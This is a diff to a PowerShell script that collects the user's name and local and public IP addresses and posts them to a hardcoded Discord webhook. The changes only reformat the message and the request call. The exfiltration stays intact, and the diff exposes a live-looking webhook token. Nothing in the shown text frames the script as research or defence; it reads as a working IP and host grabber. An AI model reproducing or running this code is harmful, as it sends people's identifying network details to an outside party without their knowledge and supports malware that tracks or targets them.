@@ -6,9 +6,12 @@ $user = $env:USERNAME
 $url = "https://discord.com/api/webhooks/1189518541670584341/A8TeIfnQFkExsGzut_zcsXwb_ZudMllg826KmP4OoPKZV5t8yA0KnrXJfRULgVcrH3S9"
 
 $jsonBody = @{
-     content = "
- ```IP:        $ipAddress | $publicIpAddress     HOSTNAME:     $user```
- "
- } | ConvertTo-Json
+    content = @"
+\`\`\`
+IP:        $ipAddress | $publicIpAddress
+HOSTNAME:  $user
+\`\`\`
+"@
+} | ConvertTo-Json
 
- Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json";
+Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json"
